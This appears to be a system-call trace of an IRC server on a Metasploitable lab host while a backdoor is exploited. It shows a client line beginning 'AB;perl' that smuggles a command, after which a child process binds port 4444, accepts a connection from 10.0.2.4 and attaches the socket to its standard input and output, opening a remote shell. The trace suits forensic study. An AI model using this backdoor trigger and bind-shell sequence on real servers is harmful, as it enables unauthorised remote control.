version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
12519 20:27:42.461781 close(6)          = 0
12519 20:27:42.461792 munmap(0xb7daa000, 4096) = 0
12519 20:27:42.461824 socket(PF_INET, SOCK_STREAM, IPPROTO_TCP) = 6
12519 20:27:42.461850 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa2bbc8) = -1 EINVAL (Invalid argument)
12519 20:27:42.461864 _llseek(6, 0, 0xbfa2bc10, SEEK_CUR) = -1 ESPIPE (Illegal seek)
12519 20:27:42.461876 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa2bbc8) = -1 EINVAL (Invalid argument)
12519 20:27:42.461886 _llseek(6, 0, 0xbfa2bc10, SEEK_CUR) = -1 ESPIPE (Illegal seek)
12519 20:27:42.461896 fcntl64(6, F_SETFD, FD_CLOEXEC) = 0
12519 20:27:42.461951 setsockopt(6, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
12519 20:27:42.461988 bind(6, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
12519 20:27:42.462014 listen(6, 5)      = 0
12519 20:27:42.462070 accept(6,  <unfinished ...>
12518 20:27:42.462362 exit_group(0)     = ?
12516 20:27:42.547501 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 12518
12516 20:27:42.557293 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
12516 20:27:42.557312 --- SIGCHLD (Child exited) @ 0 (0) ---
12516 20:27:42.557323 waitpid(-1, 0xbfed9a58, WNOHANG) = -1 ECHILD (No child processes)
12516 20:27:42.557336 sigreturn()       = ? (mask now [])
12516 20:27:42.557352 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
12516 20:27:42.557403 exit_group(0)     = ?
4519  20:27:42.557457 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 12516
4519  20:27:42.557470 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
4519  20:27:42.557485 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
4519  20:27:42.557496 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
4519  20:27:42.557506 --- SIGCHLD (Child exited) @ 0 (0) ---
4519  20:27:42.557525 send(5, ":irc.Metasploitable.LAN 451 AB;perl :You have not registered\r\n", 62, 0) = 62
4519  20:27:42.557590 time(NULL)        = 1495672062
4519  20:27:42.557601 time(NULL)        = 1495672062
4519  20:27:42.557624 gettimeofday({1495672062, 557628}, NULL) = 0
4519  20:27:42.557638 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  20:27:42.557669 clock_gettime(CLOCK_MONOTONIC, {48872, 374682499}) = 0
4519  20:27:42.557682 gettimeofday({1495672062, 557686}, NULL) = 0
4519  20:27:42.557693 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0}) = 2 (in [7 9], left {1, 0})
4519  20:27:42.557744 clock_gettime(CLOCK_MONOTONIC, {48872, 374758145}) = 0
4519  20:27:42.557757 recv(9, "REHASH\n", 8192, 0) = 7
4519  20:27:42.557775 send(9, ":irc.Metasploitable.LAN 481 bla4 :Permission Denied- You do not have the correct IRC operator privileges\r\n", 106, 0) = 106
4519  20:27:42.557803 recv(7, "PRIVMSG  #testit1 BLABLALBLALBLALBLALBLALBLALBLALABLLALBLA\nPRIVMSG  #testit1 ABCDEFGHIJKLMNOPQRSTUVWXYZ\nPRIVMSG  #testit1 ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ\n", 8192, 0) = 175
4519  20:27:42.557834 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.557851 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.557866 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.557880 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.557900 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.557915 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.557928 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.557942 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.557956 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.557970 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.557983 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.557997 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.558010 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.558024 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.558038 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.558051 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.558065 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.558078 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.558092 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.558107 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.558122 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.558135 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.558155 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.558170 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.558184 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.558198 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.558212 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.558226 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.558240 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.558259 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.558275 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.558289 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.558303 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.558317 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.558330 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.558344 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.558357 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.558371 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.558385 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.558399 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.558412 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.558426 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.558440 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.558453 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.558470 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.558488 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.558502 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.558516 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.558530 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.558544 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.558557 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.558571 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.558585 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.558598 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.558612 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.558626 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.558639 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.558653 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.558667 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.558680 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.558694 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.558707 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.558721 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.558735 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.558749 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.558769 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:42.558786 gettimeofday({1495672062, 558790}, NULL) = 0
4519  20:27:42.558797 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0}) = 1 (in [5], left {0, 870000})
4519  20:27:42.687629 clock_gettime(CLOCK_MONOTONIC, {48872, 504638483}) = 0
4519  20:27:42.687630 recv(5, 0x80b7ec0, 8192, 0) = -1 ECONNRESET (Connection reset by peer)
4519  20:27:42.687630 getsockopt(5, SOL_SOCKET, SO_ERROR, [0], [4]) = 0
4519  20:27:42.687630 send(5, "ERROR :Closing Link: [10.0.2.4] (Connection reset by peer)\r\n", 60, 0) = -1 EPIPE (Broken pipe)
4519  20:27:42.687630 --- SIGPIPE (Broken pipe) @ 0 (0) ---
4519  20:27:42.687630 close(5)          = 0
4519  20:27:42.687631 time(NULL)        = 1495672062
4519  20:27:42.687631 time(NULL)        = 1495672062
4519  20:27:42.687631 gettimeofday({1495672062, 687631}, NULL) = 0
4519  20:27:42.687631 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  20:27:42.687632 clock_gettime(CLOCK_MONOTONIC, {48872, 504646657}) = 0
4519  20:27:42.687645 gettimeofday({1495672062, 687648}, NULL) = 0
4519  20:27:42.687656 select(1024, [2 3 4 7 9], [], NULL, {1, 0} <unfinished ...>
12519 20:27:42.697799 <... accept resumed> {sa_family=AF_INET, sin_port=htons(45823), sin_addr=inet_addr("10.0.2.4")}, [16]) = 8
12519 20:27:42.697916 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa2abb8) = -1 EINVAL (Invalid argument)
12519 20:27:42.698028 _llseek(8, 0, 0xbfa2ac00, SEEK_CUR) = -1 ESPIPE (Illegal seek)
12519 20:27:42.698077 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa2abb8) = -1 EINVAL (Invalid argument)
12519 20:27:42.698108 _llseek(8, 0, 0xbfa2ac00, SEEK_CUR) = -1 ESPIPE (Illegal seek)
12519 20:27:42.698131 fcntl64(8, F_SETFD, FD_CLOEXEC) = 0
12519 20:27:42.698182 close(6)          = 0
12519 20:27:42.698252 dup(8)            = 6
12519 20:27:42.698265 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa2ba58) = -1 EINVAL (Invalid argument)
12519 20:27:42.698276 _llseek(6, 0, 0xbfa2baa0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
12519 20:27:42.698293 fstat64(6, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
12519 20:27:42.698315 dup2(6, 1)        = 1
12519 20:27:42.698327 close(6)          = 0
12519 20:27:42.698337 fcntl64(1, F_SETFD, 0) = 0
12519 20:27:42.698348 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa2ba28) = -1 EINVAL (Invalid argument)
12519 20:27:42.698358 _llseek(1, 0, 0xbfa2ba70, SEEK_CUR) = -1 ESPIPE (Illegal seek)
12519 20:27:42.698387 dup(8)            = 6
12519 20:27:42.698398 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa2ba58) = -1 EINVAL (Invalid argument)
12519 20:27:42.698460 _llseek(6, 0, 0xbfa2baa0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
12519 20:27:42.698487 fstat64(6, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
12519 20:27:42.698519 dup2(6, 0)        = 0
12519 20:27:42.698529 close(6)          = 0
12519 20:27:42.698538 fcntl64(0, F_SETFD, 0) = 0
12519 20:27:42.698551 fcntl64(0, F_SETFD, 0) = 0
12519 20:27:42.698568 read(0,  <unfinished ...>
4519  20:27:42.897631 <... select resumed> ) = 1 (in [7], left {0, 790000})
4519  20:27:42.897631 clock_gettime(CLOCK_MONOTONIC, {48872, 714640202}) = 0
4519  20:27:42.897631 recv(7, "TIME\n", 8192, 0) = 5
4519  20:27:42.897632 time(NULL)        = 1495672062
4519  20:27:42.897632 stat64("/etc/localtime", {st_mode=S_IFREG|0644, st_size=3519, ...}) = 0
4519  20:27:42.897632 send(7, ":irc.Metasploitable.LAN 391 bla2 irc.Metasploitable.LAN :Wednesday May 24 2017 -- 20:27 -04:00\r\n", 96, 0) = 96
4519  20:27:42.897632 gettimeofday({1495672062, 897632}, NULL) = 0
4519  20:27:42.897632 select(1024, [2 3 4 7 9], [], NULL, {1, 0} <unfinished ...>
